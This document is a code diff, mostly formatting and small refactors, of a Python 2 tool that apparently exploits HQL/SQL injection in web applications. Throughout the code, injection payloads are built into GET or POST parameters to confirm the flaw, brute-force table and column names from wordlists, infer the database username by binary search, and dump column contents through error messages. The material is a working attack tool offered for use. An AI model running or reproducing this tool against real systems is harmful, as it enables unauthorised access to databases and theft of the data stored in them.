@@ -1,12 +1,10 @@
 import urlparse
-from bs4 import BeautifulSoup
-from math import *
 import urllib
 import optparse
 import requests
 import sys
-import json
 import re
+import math
 
 COOKIE = ""
 TABLES = {}
@@ -14,6 +12,7 @@ USER = ""
 VERBOSE_MODE = False
 USER_AGENT = ""
 REFERER = ""
+
 
 def send_HTTP_request(url, params):
     global COOKIE
@@ -37,7 +36,8 @@ def send_HTTP_request(url, params):
 
 ###########################
 ### Checker (exists ?) function
-###########################    
+###########################
+
 
 def column_exists(message):
     if ('not found; SQL statement:' in message):
@@ -47,11 +47,13 @@ def column_exists(message):
             return False
         return True
 
+
 def table_exists(message):
     if ('is not mapped' in message):
         return False
     else:
         return True
+
 
 def check_if_host_vulnerable(url, params, param_to_test):
     params = set_payload_in_param(params, param_to_test, "'")
@@ -62,14 +64,16 @@ def check_if_host_vulnerable(url, params, param_to_test):
     else:
         raise Exception('No Query Exception in the HTTP response.')
 
+
 def set_payload_in_param(params, param_to_test, payload):
+    params = params.copy()
     if (param_to_test not in params):
         if (param_to_test not in params['postdata']):
             print "ERROR: No " + param_to_test + " in params"
         else:
-            params['postdata'][param_to_test] = payload
+            params['postdata'][param_to_test] = params['postdata'][param_to_test] + payload
     else:
-        params[param_to_test] = payload
+        params[param_to_test] = params[param_to_test] + payload
     return params
 
 
@@ -89,6 +93,7 @@ def find_tables(url, params, param_to_test, file_table):
         table = remove_new_line_from_string(table)
         find_table(url, params, param_to_test, table)
 
+
 def find_table(url, params, param_to_test, table_name):
     params = set_payload_in_param(params, param_to_test, "'and (select count(*) from " + table_name + ") >= 0 or ''='")
     req = send_HTTP_request(url, params)
@@ -101,6 +106,7 @@ def find_table(url, params, param_to_test, table_name):
 ### Columns
 ###########################
 
+
 def find_columns(url, params, param_to_test, file_column, table_name=None):
     global TABLES
 
@@ -108,7 +114,7 @@ def find_columns(url, params, param_to_test, file_column, table_name=None):
     with open(file_column) as f:
         columns_to_test = f.readlines()
 
-    if (table_name is None):        
+    if (table_name is None):
         for table in TABLES:
             for column in columns_to_test:
                 # removing new line
@@ -120,6 +126,7 @@ def find_columns(url, params, param_to_test, file_column, table_name=None):
             column = remove_new_line_from_string(column)
             find_column(url, params, param_to_test, table_name, column)
 
+
 def find_column(url, params, param_to_test, table, column_name):
     global TABLES
 
@@ -128,18 +135,18 @@ def find_column(url, params, param_to_test, table, column_name):
         if (table not in TABLES):
             raise Exception('Table ' + table + ' does not exist ?')
 
-
     params = set_payload_in_param(params, param_to_test, "'and (select count(w." + column_name + ") from " + table + " w) >= 0 or ''='")
-    
+
     req = send_HTTP_request(url, params)
     if (column_exists(req.content)):
         insert_column_in_table(table, column_name)
     else:
-        print "[-] Column " + column_name + " in " + table + " does not exist." 
+        print "[-] Column " + column_name + " in " + table + " does not exist."
 
 ###########################
 ### Username
 ###########################
+
 
 def get_dbms_username(url, params, param, message):
     global TABLES
@@ -148,8 +155,8 @@ def get_dbms_username(url, params, param, message):
     try:
         table_to_test = TABLES.items()[0][0]
     except:
-        raise Exception('No tables found ?')    
-    
+        raise Exception('No tables found ?')
+
     display_message("Using " + table_to_test + " to retrieve user()")
 
     # get the count of the table
@@ -179,11 +186,13 @@ def get_dbms_username(url, params, param, message):
 ### Count functions
 ###########################
 
+
 def get_count_of_tables(url, params, param, message):
     global TABLES
 
     for table in TABLES:
         get_count_of_table(url, params, param, message, table)
+
 
 def get_count_of_table(url, params, param_to_test, message, name_table):
 
@@ -205,11 +214,11 @@ def retrieve_count_or_length(url, params, param_to_test, message, request, isCha
             params = set_payload_in_param(params, param_to_test, request + " = CHAR(" + inf_str + ") or ''='")
         else:
             params = set_payload_in_param(params, param_to_test, request + " = " + inf_str + " or ''='")
-        
+
         req = send_HTTP_request(url, params)
         if (message in req.content):
             break
-    
+
         if (isChar):
             params = set_payload_in_param(params, param_to_test, request + " >= CHAR(" + sup_str + ") or ''='")
         else:
@@ -220,13 +229,14 @@ def retrieve_count_or_length(url, params, param_to_test, message, request, isCha
             inf = sup
             sup = (2 * inf)
         else:
-            sup = sup - floor((sup-inf)/2)
+            sup = sup - math.floor((sup - inf) / 2)
 
     return '{:g}'.format(inf)
 
 ###########################
 ### Insert table/Column utils
 ###########################
+
 
 def insert_table_name_in_tables(table_name):
     global TABLES
@@ -239,13 +249,14 @@ def insert_table_name_in_tables(table_name):
     else:
         display_message("[-] Table " + table_name + " has been found (again).")
 
+
 def insert_column_in_table(table_name, column_name):
     global TABLES
 
     #First letter in uppercase
     table_name = table_name.title()
     column_name = column_name.title()
-    
+
     if (table_name not in TABLES):
         raise Exception('This might be a problem with ' + table_name)
 
@@ -259,10 +270,10 @@ def insert_column_in_table(table_name, column_name):
 ### Results functions
 ###########################
 
+
 def list_columns(url, params, param_to_test):
 
     global TABLES
-    columns = []
     params = set_payload_in_param(params, param_to_test, "' and test=1 and ''='")
 
     req = send_HTTP_request(url, params)
@@ -278,6 +289,7 @@ def list_columns(url, params, param_to_test):
     else:
         raise Exception('We cannot manage to retrieve columns.')
 
+
 def enumerate_tables_and_columns():
     global TABLES
 
@@ -287,8 +299,10 @@ def enumerate_tables_and_columns():
         for column in TABLES[table]:
             print "\t" + column
 
+
 def remove_new_line_from_string(string, char=''):
     return string[:-1] + char
+
 
 def display_message(message):
     global VERBOSE_MODE
@@ -299,6 +313,7 @@ def display_message(message):
 ### Dump function
 ###########################
 
+
 def dump_table_by_column(url, params, param_to_test, table, column):
     params = set_payload_in_param(params, param_to_test, "'and (select cast(concat('///', group_concat(" + column + "), '///') as string) from " + table + ")=1or ''='")
     req = send_HTTP_request(url, params)
@@ -307,11 +322,11 @@ def dump_table_by_column(url, params, param_to_test, table, column):
     for res in results:
         print "\t\t - " + res
 
+
 def get_result_from_dump(content):
     regex_result = re.search(r"&quot;///(.+)///&quot;", content)
     dump = regex_result.group(1)
     return dump.split(',')
-
 
 
 # option parser
@@ -356,15 +371,17 @@ else:
     USER_AGENT = opts.user_agent
     REFERER = opts.referer
 
-    # check for param
+    # check for GET params
     params = opts.url.split('?')[1]
-    params = dict( (k, v if len(v)>1 else v[0] ) 
-           for k, v in urlparse.parse_qs(params).iteritems() )
+    params = dict((k, v if len(v) > 1 else v[0]) for k, v in urlparse.parse_qs(params).iteritems())
 
+    # check for POST params
     params['postdata'] = None
     if (opts.postdata is not None):
-        params['postdata'] = dict( (k, v if len(v)>1 else v[0] ) 
-               for k, v in urlparse.parse_qs(opts.postdata).iteritems() )
+        params['postdata'] = dict((k, v if len(v) > 1 else v[0]) for k, v in urlparse.parse_qs(opts.postdata).iteritems())
+    else:
+        # if no POST params, delete the entry
+        del params['postdata']
 
     if (opts.param not in params):
         raise Exception('Param not in URL!')
@@ -382,7 +399,7 @@ else:
 
     # -T=<name> flag
     if (opts.table):
-        display_message("Checking if " + opts.table + " exists.") 
+        display_message("Checking if " + opts.table + " exists.")
         find_table(url, params, opts.param, opts.table)
 
     # --columns flag
